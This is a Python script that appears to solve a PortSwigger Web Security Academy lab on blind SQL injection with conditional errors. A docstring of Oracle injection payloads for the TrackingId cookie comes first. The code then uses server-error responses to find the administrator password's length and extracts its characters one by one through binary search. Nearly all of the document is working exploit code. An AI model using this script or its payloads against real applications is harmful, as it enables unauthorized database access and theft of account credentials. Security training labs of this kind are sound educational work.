"""
WHERE TrackingID = 'TRACKIN_ID' || (SELECT '' FROM users WHERE rownum = 1)--'
WHERE TrackingID = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)--'
WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)--'
WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')--'
WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')--'
WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')--'
"""
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import requests

URL = "https://acf21fff1f156a3ec0f10bbd00d500e2.web-security-academy.net/"
SESSION = "SvUsl1vRMCCkjTltieACY3Wnu3QNIOsX"
TRACKING_ID = "SJOD5F28cetQJq7u"
CHAR_SPACE = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']


def get_pwd_length(cookies):
    guess_len = 1
    cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN LENGTH(password)>" + str(guess_len) + " THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username = \'administrator\')--"
    res = requests.get(URL, cookies=cookies)
    if "Internal Server Error" not in res.text:
        print("guessed password length: ", guess_len)
        return guess_len
    else:
        while ("Internal Server Error" in res.text):
            guess_len += 1
            cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN LENGTH(password)>" + str(guess_len) + " THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username = \'administrator\')--"
            res = requests.get(URL, cookies=cookies)
        print("guessed password length: ", guess_len)
        return guess_len



def cursor_check(cookies, pswd_i, target):
    cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN SUBSTR(password, " + pswd_i + ", 1)=\'" + target + "\' THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username=\'administrator\')--"
    r = requests.get(URL, cookies=cookies)
    cookies["TrackingId"] = ""
    return ("Internal Server Error" in r.text)


def right_check(cookies, pswd_i, target):
    cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN SUBSTR(password, " + pswd_i + ", 1)>\'" + target + "\' THEN TO_CHAR(1/0) ELSE \'\' END FROM users WHERE username=\'administrator\')--"
    r = requests.get(URL, cookies=cookies)
    cookies["TrackingId"] = ""
    return ("Internal Server Error" in r.text)


# determines password character at one position
# returns CHAR_SPACE index
def recursiveBinarySearch(l, r, cookies, pswd_i):
    print("r: ", r, "\nl: ", l)
    if r >= l:
        mid = l + (r - l + 1) // 2
        print("Checking ", CHAR_SPACE[mid], " at CHAR_SPACE[", mid, "]")

        if cursor_check(cookies, str(pswd_i), CHAR_SPACE[mid]):
            print(pswd_i, ": ", CHAR_SPACE[mid])
            return mid
        elif right_check(cookies, str(pswd_i), CHAR_SPACE[mid]):
            return recursiveBinarySearch(mid + 1, r, cookies, str(pswd_i))
        else:
            return recursiveBinarySearch(l, mid - 1, cookies, str(pswd_i))
    else:
        return -1


def main():
    # true: test condition NOT met
    # error: test condition met
    print("determining password length...")
    cookies = dict(session=SESSION, TrackingId="")
    pwd_length = get_pwd_length(cookies)
    print("password length: ", pwd_length, "\n")
    
    cursor = 1
    admin_pwd = ""
    while cursor <= pwd_length:
        print("determing password character", cursor, "...")
        cookies["TrackingId"] = ""
        pwd_char_ind = recursiveBinarySearch(0, 35, cookies, cursor)
        try:
            print("password character", cursor, ": ", CHAR_SPACE[pwd_char_ind], "\n")
        except IndexError:
            print("Could not determine password character. Breaking...", "\n")
            break
        admin_pwd += CHAR_SPACE[pwd_char_ind]
        cursor += 1
    print(admin_pwd)


main()
